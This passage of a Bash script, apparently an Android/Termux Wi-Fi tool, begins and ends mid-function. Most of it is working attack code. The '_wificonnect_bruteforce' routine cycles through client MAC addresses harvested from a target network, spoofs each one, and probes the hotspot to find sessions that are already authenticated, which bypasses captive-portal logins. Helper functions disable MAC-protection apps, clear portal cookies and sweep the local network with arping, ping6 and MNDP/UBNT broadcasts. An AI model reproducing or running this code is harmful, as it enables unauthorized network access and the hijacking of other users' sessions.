																							    if ($2 ~ /^[a-z0-9:]{17}$/) {
																							      if (e["MAC"]) {
																							        printf("{\"mac\":\"%s\",\"ssid\":\"%s\",\"freq\":\"%s\",\"sig\":\"%s\",\"sig%\":\"%s\",\"wpa\":\"%s\",\"wpa2\":\"%s\",\"wep\":\"%s\",\"tkip\":\"%s\",\"ccmp\":\"%s\"},\n",
																							          e["MAC"], e["SSID"], e["freq"], e["sig"], e["sig%"], e["WPA"], e["WPA2"], e["WEP"], e["TKIP"], e["CCMP"]);
																							      }
																							      e["MAC"] = $2;
																							      e["WPA"] = "n";
																							      e["WPA2"] = "n";
																							      e["WEP"] = "n";
																							      e["TKIP"] = "n";
																							      e["CCMP"] = "n";
																							      e["LAST"] = "n";
																							    }
																							  }
																							  if ($1 == "SSID:" && e["LAST"] == "n") {
																							    e["LAST"] = "y"; e["SSID"] = substr($0, index($0,$2));
																							    gsub("\x1e", "0", e["SSID"]);
																								gsub("\"", "\\&quot;", e["SSID"]);
																								gsub(/'\''/, "\\&squot;", e["SSID"]);
																								gsub("\\\\x5c", "\\&bslash;", e["SSID"]);
																							  }
																							  if ($1 == "freq:") {
																							    e["freq"] = $NF;
																							  }
																							  if ($1 == "signal:") {
																							    e["sig"] = $2 " " $3;
																							    e["sig%"] = (60 - ((-$2) - 40)) * 100 / 60;
																							  }
																							  if ($1 == "WPA:") {
																							    e["WPA"] = "y";
																							  }
																							  if ($1 == "RSN:") {
																							    e["WPA2"] = "y";
																							  }
																							  if ($1 == "WEP:") {
																							    e["WEP"] = "y";
																							  }
																							  if ($4 == "CCMP" || $5 == "CCMP") {
																							    e["CCMP"] = "y";
																							  }
																							  if ($4 == "TKIP" || $5 == "TKIP") {
																							    e["TKIP"] = "y";
																							  }
																							}
																							END {
																							  printf("{\"mac\":\"%s\",\"ssid\":\"%s\",\"freq\":\"%s\",\"sig\":\"%s\",\"sig%\":\"%s\",\"wpa\":\"%s\",\"wpa2\":\"%s\",\"wep\":\"%s\",\"tkip\":\"%s\",\"ccmp\":\"%s\"}\n",
																							    e["MAC"], e["SSID"], e["freq"], e["sig"], e["sig%"], e["WPA"], e["WPA2"], e["WEP"], e["TKIP"], e["CCMP"]);
																							  printf("]\n")
																							}')" | tr '\0' '0'
																						}
																		local i t IFS result ssid wifiscan_date u
																			t=0; IFS=$'\n'
																	until [ "$t" = "5" ]; do
																			t=$((t+1)); [ $t -ge 5 ] && return 1
																		i=0; unset list_wifi_view list_wifi_json
																			_wificonnect_status "is_enabled"
																				_echo "- Performing Wi-Fi scan, please wait..." 1
																					wifiscan_date="$(date +%s)"
																						result="$(_begin_wifiscan "${iface}")"
																							[[ "${result}" =~ "command failed: Device or resource busy" ]] && continue
																						
																			# parse result
																			bssid_list=($(echo "$result" | jq -r .[].mac 2>"${home_dir}/logs/err"))
																				[ -s "${home_dir}/logs/err" ] && { _echo "\t${color_error}Unexpected return of wifiscan exiting...${color_reset}" 1; echo "${result}" >"${home_dir}/logs/wifiscan_result_json_${wifiscan_date}.log"; cat "${home_dir}/logs/tmp" >"${home_dir}/logs/wifiscan_result_${wifiscan_date}.log"; return 1; }
																				[ -z "${bssid_list[0]}" ] && { sleep 1.0; continue; }
																					ssid_list=($(echo "$result" | jq .[].ssid))
																						freq_list=($(echo "$result" | jq -r .[].freq))
																							wpa2_list=($(echo "$result" | jq -r .[].wpa2))
																								wpa_list=($(echo "$result" | jq -r .[].wpa))
																									wep_list=($(echo "$result" | jq -r .[].wep))
																										sig_list=($(echo "$result" | jq -r '.[]."sig%"' | awk -F '.' '{print $1}'))
																		for ssid in ${ssid_list[@]}; do
																			if [ "${wpa2_list[$i]}" = "y" ]; then
																				secX[$i]="🔒"
																				secY[$i]="wpa2"
																			elif [ "${wpa_list[$i]}" = "y" ]; then
																				secX[$i]="🔒"
																				secY[$i]="wpa"
																			elif [ "${wep_list[$i]}" = "y" ]; then
																				secX[$i]="🔒"
																				secY[$i]="wep"
																			else
																				secX[$i]="🔑"
																				secY[$i]="open"
																			fi
																				u="${ssid:1:-1}"
																			if [ -z "${u//0/}" ]; then
																				ssid="\"hidden_ssid_${bssid_list[$i]//:/}\""
																				ssid_list[$i]="${ssid}"
																			fi
																			if [ $i -eq 0 ]; then
																				ssid="${ssid:1:-1}"; ssid="${ssid//&quot;/\"}"; ssid="${ssid//&squot;/\'}"; ssid="${ssid//&bslash;/\\}"
																				list_wifi_view[$i]="SSID:@Sec:@Sig:\n ${i}) ${ssid}@${secX[$i]}@${sig_list[$i]}%\n"
																			else
																				ssid="${ssid:1:-1}"; ssid="${ssid//&quot;/\"}"; ssid="${ssid//&squot;/\'}"; ssid="${ssid//&bslash;/\\}"
																				list_wifi_view[$i]="${i}) ${ssid}@${secX[$i]}@${sig_list[$i]}%\n"
																			fi
																			if [ -z "$list_wifi_json" ]; then
																				list_wifi_json='"'${bssid_list[$i]}'":{"ssid":'${ssid_list[$i]}',"freq":"'${freq_list[$i]}'","sec":"'${secY[$i]}'"}'
																			else
																				list_wifi_json=''${list_wifi_json}',"'${bssid_list[$i]}'":{"ssid":'${ssid_list[$i]}',"freq":"'${freq_list[$i]}'","sec":"'${secY[$i]}'"}'
																			fi
																				i=$((i+1))
																		done
																				return 0
																				_json_initconfig || return 1; _json_networkinfoauto
																	done
																		return 1
																}
											_wificonnect_connect()
																{
																		local ssid sec bssid err i
																		ssid="${1}"; sec="${2}"; bssid="${3}"
																	if [[ "${ssid}" =~ (hidden_ssid_*) ]]; then
																		_echo "\t${color_error}Not supported yet connecting to:${color_reset} ${ssid}" 1
																		return 1
																	fi

																		_connection_interface_connect "${ssid:1:-1}" "${sec}" &>>"${log_file}"; err=${?}
																	if [ ${err} -eq 0 ]; then
																		_echo "\t${color_success}Connection succedd: ${ssid}${color_reset}" 1
																		return 0
																	else
																		_echo "\t${color_error}Failed connecting to: ${ssid}${color_reset}" 1
																		return 1
																	fi
																}
											_wificonnect_select()
																{
																		local p pad cur_bssid b
																		ssid=0; bssid=0; sec=0; p="s"
																		pad="============================================="
																	while true; do
																		if [ "$p" = "s" ]; then
																			if [ "${wifi_force_select}" != "yes" ]; then
																				cur_bssid="$(su -c ''${prefix}'/iw dev '${iface}' link 2>&1 | '${prefix}'/grep -Po '\''Connected to \K[^ ]*'\''')"
																			fi
																			if [ "${wifi_force_select}" = "yes" ]; then
																				_echo "\t\t_wificonnect_select --> manually wifi connect mode is requested" 0
																			elif [ -n "${cur_bssid}" ]; then
																				_wificonnect_status "get_wifi_info" && return 0 || return ${?}
																			fi
																				_wificonnect_getinfo || return 1
																		fi
																			echo -e "${list_wifi_view[@]}" | column -t -s $'@' | sed "s|Sig:|Sig:\n${pad}|"
																			echo -e "s) Scan again\nx) Exit\n${pad}"
																			read -p "- Please enter your option:" p
																		if [ -z "${p}" ]; then
																			p=0; _echo "\t${color_error}Error you have entered: null${color_reset}" 1
																			_echo "\t${color_tip}Tip: Type your option, then click enter${color_reset}" 1; sleep 3; continue
																		elif [ "${p}" = "s" ]; then
																			p="s"; continue
																		elif [ "${p}" = "x" ]; then
																			return 1
																		elif [[ "${p:0:1}" = [0-9] ]] || [[ "${p:0:2}" = [0-9][0-9] ]]; then
																			bssid="${bssid_list[$p]}"
																				[ -z "${bssid}" ] && continue
																			ssid="${ssid_list[$p]}"
																			sec="${secY[$p]}"
																			return 0
																		else
																			_echo "\t${color_error}${p} is invalid option, try again${color_reset}" 1; sleep 3; continue
																		fi
																	done
																}
											_wificonnect_getclients()
																{
																			local c x y z list i exclude addr clients_list exclude_list xclients_list vendor_list vclients_list fclients_list index


																			_echo "- Starting to target Wi-Fi:" 1

																			# cbssid, tbssid, requests, filtered
																			i=(0 0 0 0)
																			
																			_echo "\tGetting list..." 1
																		if [ "${#gid}" -eq 32 ]; then
																			if [ ${#bssid_list[@]} -ge 1 ]; then
																				i[0]="${#bssid_list[@]}"
																			else
																				i[0]=1
																			fi
																		else
																			_echo "\tError: GID length is incorrect: ${#gid}" 1
																			return 1
																		fi
																			unset tbssid
																	while read y; do
																			tbssid+=",\"${y}\""
																		if [ ${i[1]} -eq 0 ]; then
																			list="\"${y}\""
																		else
																			list+=",\"${y}\""
																		fi
																			i[1]=$((i[1]+1))
																	done< <(cat "${db_file}" | jq --arg k "${gid}" '.ws.gid.[$k].list' | sed '/\[/d; /\]/d; /null/d; s/[,\"]//g')
																	vendor_list=$(cat $PREFIX/share/arp-scan/ieee-oui.txt | grep -v "^#" | awk '{print $1}' | awk '{print length, $0}' | sort -n | awk '{print $2}' | tr "\n" " ")
																	clients_list=$(jq '.ws.bssid.['$list'].clients' "${db_file}" | sed '/\[/d; /\]/d; /null/d; s/[,\"]//g' | sort | uniq | shuf | tr "\n" " ")
																	exclude_list=$(jq '.ws.bssid.['$list'].xclients' "${db_file}" | sed '/\[/d; /\]/d; /null/d; s/[,\"]//g' | sort | uniq | shuf | tr "\n" " ")
																	tclients_list=$(jq '.ws.bssid.['$list'].["tclients","admins"]' "${db_file}" | sed '/\[/d; /\]/d; /null/d; s/[,\"]//g' | sort | uniq | shuf | tr "\n" " ")

																		_echo "\tFiltering xclients..." 1
																		unset xclients
																	for y in ${exclude_list}; do
																		if [[ "${tbssid}" =~ "${y}" ]]; then
																			xclients+=" ${y}"; continue
																		elif [[ "${tclients_list}" =~ "${y}" ]]; then
																			continue
																		elif ([ "${ws_interface_allows}" = "even" ] && \
																			[[ "${y:0:2}" =~ (1|3|5|7|9|B|b|D|d|F|f) ]]); then
																			continue
																		fi
																			addr="${y//:/}"; addr="${addr:0:6}"
																		if [[ "${vendor_list}" =~ "${addr}" ]]; then
																			vclients_list+=" ${y}"; continue
																		fi
																			xclients+=" ${y}"; xclients_list+=" ${y}"
																	done

																		_echo "\tFiltering clients..." 1
																	for y in ${clients_list}; do
																		if [[ "${tbssid}" =~ "${y}" ]]; then
																			xclients+=" ${y}"; continue
																		elif [[ "${tclients_list}" =~ "${y}" ]]; then
																			continue
																		elif [[ "${xclients_list}" =~ "${y}" ]]; then
																			xclients+=" ${y}"; continue
																		elif ([ "${ws_interface_allows}" = "even" ] && \
																			[[ "${y:0:2}" =~ (1|3|5|7|9|B|b|D|d|F|f) ]]); then
																			continue
																		fi
																			addr="${y//:/}"; addr="${addr:0:6}"
																		if [[ "${vendor_list}" =~ "${addr}" ]]; then
																			vclients_list+=" ${y}"
																			continue
																		fi
																			fclients_list+=" ${y}"
																	done
																			unset reqs_list
																			index[1]=$(echo "${xclients_list}" | wc -w)
																			index[2]=$(echo "${tclients_list}" | wc -w)
																			index[3]=$(echo "${vclients_list}" | wc -w)
																			index[4]=$(echo "${fclients_list}" | wc -w)

																			index[0]=$((index[1]+index[2]+index[3]+index[4]))
																			i[2]=$((index[3]+index[4])); i[3]=$((index[1]+index[2]))
																			max_reqs="${index[0]}"
																		if [ ${i[2]} -eq 0 ]; then
																			# no more clients left
																			reqs_list="${fclients_list} ${vclients_list} ${tclients_list} ${xclients_list}"
																		else
																			reqs_list="${fclients_list} ${vclients_list} ${xclients_list} ${tclients_list}"
																		fi
																			_echo "\tTotal CBSSID: ${i[0]}\n\tTotal TBSSID: ${i[1]}\n\tTotal requests: ${i[2]}\n\tTotal filtered: ${i[3]}" 1
																		if [ ${max_reqs} -gt 10 ]; then
																			return 0
																		else
																			_echo "\t${color_error}Error current available requests is ${i[2]}${color_reset}" 1
																			_echo "\t${color_tip}Tip: Use scan mode first then try again${color_reset}" 1
																			play-audio "$home_dir/sfx/notification_error.m4a" &
																			return 1
																		fi
																}
											_wificonnect_getgid()
																{
																			_process_networkinfo || return 1
																		if [ "${gid}" = "0" ]; then
																			_error_msg "Error network GID is: ${gid}" "Tip: No internet connection available !"
																			return 1
																		elif [ "${host}" = "0" ]; then
																			_error_msg "Error host address is: ${host}" "Tip: No internet connection available !"
																			return 1
																		fi
																}
											_wificonnect_bruteforce()
																{
																	local c x y t n r cooldown curr_addr status_tries
																			_wificonnect_select || return 1
																			_wificonnect_status "is_disconnected" || return 1
																			_wificonnect_clear; _macchanger_set "--random" || return 1
																			_wificonnect_connect "${ssid}" "${sec}" "${bssid}" || return 1
																			_wificonnect_getgid || return 1
																			_wificonnect_getclients || return 1
																			n=0; t=1; cooldown=0
																	for x in ${reqs_list}; do
																			_echo "\t${color_tip}Proccessing: ${t}/${max_reqs}${color_reset}" 1
																			t=$((t+1)); r="${color_error}"
																			{ _wificonnect_status "is_disabled" || return 1; _wificonnect_status "is_disconnected" || return 1; _macchanger_set "${x}" || return 1; }
																		if ! _wificonnect_connect "${ssid}" "${sec}" "${bssid}"; then
																			cooldown=$((cooldown+1))
																			_echo "\t\t_wificonnect_bruteforce --> error connection failed with address: [request_addr](client: ${x})" 0
																			[ ${cooldown} -ge 3 ] && { cooldown=0; _echo "\t${color_warn}Bottleneck was hit now cooling down..." 1; _echo "\t\t_wificonnect_bruteforce --> error bottleneck was hit: [tries](${t})" 0; sleep 120; }
																			continue
																		fi
																			curr_addr="$(su -c ''${prefix}'/iw dev '${iface}' info 2>&1 | '${prefix}'/grep -Po '\''addr \K.*'\''')"
																		if [ -z "${curr_addr}" ]; then
																			_echo "\t${color_error}Error current address is: null${color_reset}" 1
																			_echo "\t\t_wificonnect_bruteforce --> error requested current address is null: [current_addr](${curr_addr}) [request_addr](${x})" 0
																			play-audio "$home_dir/sfx/notification_error.m4a" &
																			break
																		elif [ "${x}" != "${curr_addr}" ]; then
																			_wificonnect_macsposed "--enable"
																			_echo "\t${color_error}Error request mismatch: ${curr_addr}${color_reset}\n\t${color_tip}Tip: Battery saver killed MACsposed !${color_reset}" 1
																			_echo "\t\t_wificonnect_bruteforce --> error requested and current address does not match: [current_addr](${curr_addr}) [request_addr](${x})" 0
																			play-audio "$home_dir/sfx/notification_error.m4a" &
																			break
																		else	
																			_wificonnect_macsposed "--disable" "${x}"
																			cooldown=0

																				status_tries=0; unset c
																			until [ ${status_tries} -ge 3 ]; do
																				status_tries=$((status_tries+1))
																				curl -m2 -vsLA "${useragent}" "${host}:${port}/${status}" >"${home_dir}/logs/tmp" 2>"${home_dir}/logs/err"
																				c=$(cat "${home_dir}/logs/err" | tr '\t\r\n*' '#')

																				if [[ "${c}" =~ "timed out after" ]]; then
																					c="ERROR: ${c}"
																					_echo "\t${color_success}Trying again for: ${x}${color_reset}" 1
																					_wificonnect_status "is_disconnected"
																					_wificonnect_connect "${ssid}" "${sec}" "${bssid}"
																				else
																					break
																				fi
																			done
																			if [ ${status_tries} -ge 3 ]; then
																				_echo "\t${color_error}Failed requesting for: ${x}${color_reset}" 1
																			fi
																		fi

																		if [[ "${c}" =~ "ERROR:" ]]; then
																			false
																		elif [[ "${c}" =~ (Location: .*login|HTTP/1.1 302 Hotspot login required) ]]; then
																			xclients+=" ${x}"
																		elif [[ "${c}" =~ (Location: .*status|HTTP/1.1 200 OK) ]]; then
																			tclients+=" ${x}"
																			n=$((n+1)); r="${color_success}"
																			{ stdin="${home_dir}/logs/tmp"; _parse_html; }
																			play-audio "$home_dir/sfx/notification_done.m4a" &
																			[ "${acbd18db4cc2f85cedef654fccc4a4d8}" = "1" ] || break
																		elif [[ "${c}" =~ "failed: Connection refused" ]]; then
																			admins+=" ${x}"
																			n=$((n+1))
																			{ stdin="${home_dir}/logs/tmp"; _parse_html; }
																			play-audio "$home_dir/sfx/notification_done.m4a" &
																			[ "${acbd18db4cc2f85cedef654fccc4a4d8}" = "1" ] || break
																		elif [ ! -s "${home_dir}/logs/tmp" ]; then
																			_echo "\t\t_wificonnect_bruteforce --> error requested address returned null: [request_addr](${x}) [result](${c})" 0
																		else
																			_echo "\t\t_wificonnect_bruteforce --> error could not determine status: ${c}" 0
																			c="${home_dir}/logs/wifistatus_$(date +%s).log"
																			_echo "\t\t_wificonnect_bruteforce --> dumping result into: ${c}" 0
																			cat "${home_dir}/logs/tmp" >"${c}"
																		fi

																		if [ ${t} -gt ${max_reqs} ]; then
																			play-audio "$home_dir/sfx/notification_error.m4a" &
																			break
																		fi
																	done
																			_echo "\t${r}Finished with ${n} success${color_reset}" 1
																			return 1
																}
											_macchanger_set()
																{
																	local err result req

																	if [ "${1}" = "--random" ]; then
																		req="ghost"
																	else
																		req="client"
																	fi
																		_connection_interface_setaddr "${1}" "${ws_macchanger_alt}" "${iface}" "${prefix}" &>>"${log_file}"; err=${?}; result="${ret}"
																	if [ ${err} -ne 0 ]; then
																		_echo "\tUnexpected error setting address failed: ${result}" 1
																		return 1
																	else
																		_echo "\tRequesting for ${req}: ${result}" 1
																		return 0
																	fi
																}
											_wificonnect_survival()
																{
																		local i
																		_echo "- Startting survival Wi-Fi connection:" 1
																		i=0; _wificonnect_select || return 1
																		su -c 'killall watch 2>/dev/null' &>/dev/null &
																	while true; do
																		_wificonnect_status "is_disabled" || return 1
																		[ $i -ge 1 ] && _echo "\tConnection was lost: $(date +%r)" 1
																		_wificonnect_connect "${ssid}" "${sec}" "${bssid}" || continue
																		 su -c ''${prefix}'/watch -g '\'''${prefix}'/cmd wifi status 2>&1 | grep -Fo '${bssid}''\'' &>/dev/null'
																		i=$((i+1))
																	done
																}
											_wificonnect_macsposed()
																{
																	local x y

																	if [ "${ws_auto_macsposed}" = "no" ] || [ "${1}" = "--enable" ]; then
																		echo -n>"${home_dir}/logs/_init_macsposed_disabled.log"
																		sudo pm enable "com.berdik.macsposed"
																		return 0
																	elif [ -n "${_STATE_MACSPOSED}" ]; then
																		return 0
																	elif [ -s "${home_dir}/logs/_init_macsposed_disabled.log" ]; then
																		_STATE_MACSPOSED="1"
																		return 0
																	elif [ "${1}" = "--disable" ]; then
																			local x
																			_STATE_MACSPOSED="1"
																			echo >"${home_dir}/logs/_init_macsposed_disabled.log"
																			sudo pm disable "com.berdik.macsposed"
																		if [ -s "${home_dir}/logs/_init_macsposed_persist.log" ]; then
																			_echo "Initializing macsposed-persist..." 1
																			su -c 'local n; echo "cmd wifi set-wifi-enabled disabled" | su -; sleep 3; echo "cmd wifi set-wifi-enabled enabled" | su -; sleep 3; n=$('${prefix}'/iw dev '${iface}' info 2>&1 | '${prefix}'/grep -Po '\''addr \K.*'\''); [ "${n}" != "'${x}'" ] && sed -i "s|addr=.*|addr=\"${n}\"|" "/data/adb/service.d/macsposed-persist.sh"'
																			echo -n>"${home_dir}/logs/_init_macsposed_persist.log"
																		fi
																	else
																		echo "_wificonnect_macsposed: unknown option: ${1}"
																	fi
																}
											_wificonnect_test()
																{
																		local result x
																		_echo "- Performing eligibility test..." 1
																		_wificonnect_select || return 1
																			_echo "- Starting comptiablity checker..." 1
																				_wificonnect_status "is_disconnected" || return 1
																					_macchanger_set "--random"; result="${ret}" || return 1
																						_wificonnect_connect "${ssid}" "${sec}" "${bssid}" || \
																									{ 
																										play-audio "$home_dir/sfx/notification_error.m4a" &
																										return 1
																									}
																		x=$(su -c ''${prefix}'/iw dev '${iface}' info 2>&1 | '${prefix}'/grep -Po "addr \K.*"')
																	if [ "${x}" = "${result}" ]; then
																		_wificonnect_macsposed "--disable" "${result}"
																		_echo "\t${color_success}Eligibility test passed !${color_reset}" 1
																		return 0
																	else
																		play-audio "$home_dir/sfx/notification_error.m4a" &
																		_echo "\t${color_error}Eligibility test failed !${color_reset}\n\t${color_tip}Tip: Make sure MACsposed is enabled.${color_reset}" 1
																		return 1
																	fi
																}
											_wificonnect_clear()
																{
																	if [ -n "${ws_captiveportal_alt}" ]; then
																		_echo "\t${color_tip}Clearing Captive-Portal's cookies...${color_reset}" 1
																		su -c 'local x list; list="'${ws_captiveportal_alt}'"; for x in ${list}; do echo "pm clear ${x}" | su - >/dev/null 2>&1 || echo "failed clearing: ${x}"; done'
																	fi
																}
											_wificonnect_reset()
																{
																	_echo "- Resetting network settings:" 1
																	_echo "\t${color_tip}Removing saved networks...${color_reset}" 1
																	su -c 'local i x y z list; i=0; list="$(echo "cmd wifi list-networks" | su - | grep -F "open" | awk '\''{print $1}'\'' | tr "\n" " ") EOF"; for x in ${list}; do i=$((i+1)); [ "${x}" != "EOF" ] && { y+=" ${x}"; z+="cmd wifi forget-network ${x}; "; }; ([ ${i} -ge 10 ] || [ "${x}" = "EOF" ]) && { [ -z "${y}" ] && continue; echo "removing networks: ${y}"; unset y; i=0; echo "${z}" | su - >/dev/null; } || { continue; }; done'

																	_wificonnect_clear
																	_echo "\t${color_success}Completed !${color_reset}" 1
																	return 0
																}
											_wificonnect_wsconfig()
																{
																	if [ -s "${home_dir}/logs/_init_new_ws.log" ]; then
																			# setting ws_disconnect_alt to 1 will not work properly on some devices
																		if ([ "${ws_disconnect_alt}" = "1" ] || \
																			[ -z "${ws_disconnect_alt}" ] || \
																			[ -z "${ws_interface_allows}" ] || \
																			[ -z "${ws_macchanger_alt}" ]); then
																			sudo "${home_dir}/plugins/wsconfig.sh"
																			echo -n>"${home_dir}/logs/_init_new_ws.log"
																			source "${home_dir}/.wsprofile"
																		else
																			echo -n>"${home_dir}/logs/_init_new_ws.log"
																		fi
																	else
																		return 0
																	fi
																}
											_wificonnect_autoscan()
																{
																		_autoscan_getinfo()
																						{
																								local c
																								_process_networkinfo &>/dev/null
																								_process_scan 3 &>/dev/null; c="$?"
																							if [ ${c} -le 1 ]; then
																								stat[0]=$((stat[0]+1)); result="empty"
																							elif [ ${c} -eq 2 ]; then
																								stat[1]=$((stat[1]+1)); result="dominant"
																							elif [ ${c} -eq 3 ]; then
																								stat[2]=$((stat[2]+1)); result="checkmate"
																							else
																								result="error"
																							fi
																								_echo "\t\t_autoscan_getinfo --> returned result: [ssid](${ssid}) [bssid](${bssid}) [sec](${sec}) [arp-scan](${result})" 0
																								_echo "\t${color_warn}Result: ${result}${color_reset}" 1
																								{ _json_initconfig && _json_networkclients; }
																						}
																		local t i ssid bssid sec total t result stat procc
																		[ "${1}" = "pin" ] && echo -n>"${home_dir}/logs/bssidx.log"
																		mode="auto"; stat=(0 0 0)
																		_wificonnect_status "is_disconnected" || return 1
																		_macchanger_set "--random" || return 1
																		AUTO_SCAN_TIMEOUT="3"
																	while true; do
																			_echo "- Running ${1} network discovery: $(date +%r)" 1
																			_wificonnect_status "is_disabled" || return 1
																			_wificonnect_getinfo || continue
																				[ "${1}" = "pin" ] && echo "${bssid_list[@]}" >>"${home_dir}/logs/bssidx.log"
																				i=0; total="${#bssid_list[@]}"; t=1
																		while true; do
																				bssid="${bssid_list[$i]}"
																					[ -z "${bssid}" ] && break
																				ssid="${ssid_list[$i]}"
																				sec="${secY[$i]}"
																			if ([ "${1}" = "auto" ] && [ ${total} -le 20 ] && [ ${sig_list[$i]} -gt 50 ]) || \
																				([ "${1}" = "auto" ] && [ ${total} -le 50 ] && [ ${sig_list[$i]} -gt 60 ]) || \
																				([ "${1}" = "auto" ] && [ ${total} -gt 50 ] && [ ${sig_list[$i]} -gt 70 ]) || \
																				([ "${1}" = "fast" ] && [ ${total} -le 50 ] && [ ${sig_list[$i]} -gt 50 ]) || \
																				([ "${1}" = "fast" ] && [ ${total} -gt 50 ] && [ ${sig_list[$i]} -gt 60 ]); then
																				_echo "\t${color_new}Proccessing: ${t}/${total}${color_reset}" 1
																				_wificonnect_status "is_disconnected" || return 1
																				_wificonnect_connect "${ssid}" "${sec}" "${bssid}" && _autoscan_getinfo
																			else
																				_echo "\t${color_warn}Skipping network with weak signal:${color_reset} ${sig_list[$i]}%" 1
																			fi
																				i=$((i+1)); t=$((t+1))
																		done
																			if [ "${1}" = "fast" ]; then
																				play-audio "$home_dir/sfx/notification_error.m4a" &
																				_echo "\t${color_tip}Total Empty: ${stat[0]}${color_reset}\n\t${color_tip}Total Dominant: ${stat[1]}${color_reset}\n\t${color_tip}Total CheckMate: ${stat[2]}${color_reset}" 1
																				break
																			fi
																	done
																}
												local u x err d
												_source_plugin "${home_dir}/plugins/connection-status.sh" || return 1
											if  [ "${1}" = "quick_setaddr" ]; then
												[ "${2: -1}" = "," ] && d="${2:0: -1}" || d="${2}"
												_wificonnect_status "get_wifi_info" || { _macchanger_set "${d}"; return ${?}; }
												_wificonnect_status "is_disconnected" || return ${?}
												_macchanger_set "${d}" || return ${?}
												_wificonnect_connect "${ssid}" "${sec}" || return ${?}
												return 0
											elif [ "${1}" = "reconnect" ]; then
												_wificonnect_status "reconnect" || return ${?}
												return 0
											fi
												_echo "- Startting connect mode:" 1

												# tests
												_wificonnect_wsconfig

											if  [ "$1" = "a" ]; then
												_wificonnect_autoscan "auto"
											elif  [ "$1" = "f" ]; then
												_wificonnect_autoscan "fast"
											elif  [ "$1" = "c" ]; then
												wifi_force_select="yes"
												_wificonnect_select || return 1
												_wificonnect_connect "${ssid}" "${sec}" "${bssid}"
											elif  [ "$1" = "s" ]; then
												_wificonnect_survival
											elif  [ "$1" = "n" ]; then
												_wificonnect_select || return 1
												_wificonnect_status "is_disconnected" || return 1
												_macchanger_set "--random" || return 1
												_wificonnect_connect "${ssid}" "${sec}" "${bssid}" || return 1
												_wificonnect_getgid || return 1
												_wificonnect_getclients || return 1
											elif  [ "$1" = "x" ]; then
												_wificonnect_bruteforce || return 1
											elif  [ "$1" = "t" ]; then
												_wificonnect_test
											elif  [ "$1" = "r" ]; then
												_wificonnect_reset
											fi
												return 0
										}
						_process_arping()
										{
												local i addr arr prev u
												_echo "- Startting arping scan:" 1
												[ -z "$gateway" ] && { _echo "\tError missing gateway variable" 1; return 1; }
												prev=0; i=0; addr=(${gateway//\./ }); addr="${addr[0]}.${addr[1]}.${addr[2]}"
												unset clients
											until [ $i -ge 255 ]; do
													i=$((i+1)); _echo "\tWaiting reply from: ${addr}.${i}" 1
													arr=($(su -c 'timeout -k3 3 '${prefix}'/arping -i '${iface}' -rRC1 '${addr}'.'${i}' 2>&1 | tr '\n' ' ''))
													log+="\t\t_process_arping --> current line: ${arr[@]}\n"
												if [[ "${arr[@]}" =~ (run as root) ]]; then
													_echo "Error cannot start arping scan\nTip: Try again with sudo" 1
												elif [[ "${arr[@]}" =~ (No such device) ]]; then
													_echo "$iface is invalid interface\nTip: Try to select a valid interface" 1; return 1
												elif [[ "${arr[@]}" =~ (resolve) ]]; then
													_echo "$gateway is invalid gateway address\nTip: Try to select a valid gateway" 1; return 1
												elif [ "$prev" = "${arr[0]}" ] || [ "$prev" = "${arr[9]}" ]; then
													_echo "\tError identical with previous response" 1; break
												elif [[ "${arr[@]}" =~ "Failed to create landlock ruleset" ]]; then
													if [ -n "${arr[9]}" ]; then
														_echo "\tReceived respond from: ${arr[9]}" 1
														prev="${arr[9]}"
													fi
												elif [ -n "${arr[0]}" ]; then
												 _echo "\tReceived respond from: ${arr[0]}" 1
													prev="${arr[0]}"
												fi
											done
												_echo "\tCompleted with total requests: ${i}" 1
												_echo "\t_process_arping --> scan completed: ${i}" 0
										}
						_process_ping6()
										{
												# Ref: https://superuser.com/a/1135761
												local mode x list i arg
												mode="${1}"
												_convert_mac_into_ipv6 "${addr[2]}"
												i=0; list="${mac2ipv6}"
												if [ "${mode}" = "scan" ]; then
													arg="timeout -k3 3"
												else
													unset arg
												fi
												unset clients
											while read x; do
												([ -z "${x}" ] || [[ "${x}" =~ (data|statistics|\.) ]] || [ ${#x} -le 1 ]) && continue
												x="${x:0: -1}"; [[ "${list}" =~ "${x}" ]] && continue || list+=" ${x}"
												_convert_ipv6_into_mac "$x"
												i=$((i+1))
												clients+=" ${ipv62mac}"
												echo -e "\t${x} ${ipv62mac}"
											done< <(${arg} ping6 "ff02::01%${iface}" | stdbuf -oL awk '{print $4}')
											_echo "\tScan completed found: ${i} devices" 1
											_count_and_notify "${i}"; return ${?}
										}
						_process_tcpdump()
										{
												_configure_ndp()
															{
																if command -v "${prefix}/socat" >/dev/null; then
																	_echo "\t\t_configure_ndp --> sending ndp reply request" 0
																	# MNDP = 5678, UBNT = 10002
																	{
																		for ((i=0; i<10; ++i)); do
																			su -c 'echo -ne '\x00\x00\x00\x00' | '${prefix}'/socat - UDP4-DATAGRAM:255.255.255.255:5678,broadcast >/dev/null 2>&1' &
																			sleep 1
																		done
																	} &
																	{
																		for ((i=0; i<10; ++i)); do
																			su -c 'echo -ne '\x01\x00\x00\x00' | '${prefix}'/socat - UDP4-DATAGRAM:255.255.255.255:10002,broadcast >/dev/null 2>&1' &
																			sleep 1
																		done
																	} &
																else
																	_echo "\t\t_configure_ndp --> error missing utility: socat" 0; return 1
																fi
																	return 0
															}
												_packet_process_ndp()
															{
																			_parse_mndp()
																						{
																								# Structure: https://github.com/sighook/nmap-extra-nse
																								local u h m c i remaining_payload fieldsX fieldsY
																								remaining_payload="$1"
																								i=0; mndp=(0 0 0 0 0 0 0)
																								fieldsX=(0005 0007 0008 000a 000b 000c 000e 0010)
																								fieldsY=(0007 0008 000a 000b 000c 000e 0010 0011)
																							until [ $i -eq 8 ]; do
																									c="${remaining_payload/*${fieldsX[$i]}00??/}"
																									c="${c/${fieldsY[$i]}00??*/}"
																									remaining_payload="${remaining_payload/*${fieldsX}00/}"
																								if [ "${#c}" -eq "${#remaining_payload}" ]; then
																									_echo "\t\t_parse_mndp --> error parsed value and remaining_payload has same length: ${i}" 0
																									return 1
																								elif [ $i -ne 6 ]; then
																									c="${c//??/\\x&}"
																								fi
																								if [ $i -eq 3 ]; then
																									u="$(echo -ne "$c" | od -t u4 -An | tr -d ' ')"
																									h=$((u/3600)); c=$((h*3600)); c=$((u-c))
																									m=$((c/60)); c="${h}h${m}m"
																								fi
																									mndp[$i]="${c}"; i=$((i+1))
																							done
																									return 0
																						}
																			_parse_ubnt()
																						{
																								# Bash ref: https://tldp.org/LDP/abs/html/parameter-substitution.html
																								# Structure: https://github.com/sukhe/UBNT-and-MikroTik-command-line-discovery-utility
																								# Reply signtrue: https://github.com/nitefood/python-ubnt-discovery
																								local x y c i remaining_payload fields
																								remaining_payload="$1"
